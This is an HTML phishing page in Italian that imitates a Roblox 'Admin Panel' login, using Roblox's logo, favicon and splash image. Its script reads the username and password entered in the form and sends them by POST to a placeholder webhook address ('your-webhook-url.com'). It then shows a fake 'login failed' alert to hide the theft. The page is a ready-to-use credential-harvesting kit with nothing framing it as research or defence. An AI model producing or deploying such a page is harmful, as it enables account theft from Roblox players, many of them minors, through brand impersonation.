<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Panel</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico" />
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #0d0d0d;
      color: white;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background-color: #111;
      padding: 18px 40px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.6);
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .logo img {
      height: 28px;
    }

    .logo span {
      font-weight: bold;
      font-size: 18px;
    }

    .nav {
      font-size: 15px;
    }

    .hero {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      padding: 100px 20px;
      background: url('https://images.ctfassets.net/0b815kqjt7rr/6CSH5ZLZCakGZdfqkzbDNs/4d2ac74f70106de81a0b58db1b7f62a0/Roblox_Experience_Splash.jpg') center/cover no-repeat;
      position: relative;
    }

    .hero::before {
      content: '';
      position: absolute;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.7);
    }

    .hero-content {
      position: relative;
      z-index: 1;
      max-width: 600px;
    }

    .hero h1 {
      font-size: 44px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .hero p {
      font-size: 16px;
      color: #cccccc;
      margin-bottom: 40px;
    }

    .login-box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      max-width: 400px;
      margin: 0 auto;
      text-align: left;
      color: black;
    }

    .login-box h2 {
      margin-bottom: 20px;
      font-size: 24px;
      text-align: center;
      color: #111;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 15px;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #fff;
      color: #111;
      border: 2px solid #111;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      font-size: 16px;
    }

    .login-box button:hover {
      background-color: #111;
      color: white;
    }

    @media (max-width: 768px) {
      .hero h1 {
        font-size: 32px;
      }

      .login-box {
        padding: 20px;
      }
    }
  </style>
</head>
<body>

  <header>
    <div class="logo">
      <img src="https://www.roblox.com/images/Logo.png" alt="Roblox Logo" />
      <span>Admin Panel</span>
    </div>
    <div class="nav">Accedi</div>
  </header>

  <section class="hero">
    <div class="hero-content">
      <h1>Accedi all'Admin Panel</h1>
      <p>Gestisci contenuti, utenti e funzioni avanzate in modo sicuro e veloce.</p>

      <div class="login-box">
        <h2>Login</h2>
        <form onsubmit="sendData(); return false;">
          <input type="text" id="username" placeholder="Username" required />
          <input type="password" id="password" placeholder="Password" required />
          <button type="submit">Entra</button>
        </form>
      </div>
    </div>
  </section>

  <script>
    function sendData() {
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      fetch("https://your-webhook-url.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `ðŸ‘¤ Login:\nUsername: ${u}\nPassword: ${p}`
        })
      });

      alert("Accesso fallito. Riprova.");
    }
  </script>

</body>
</html>
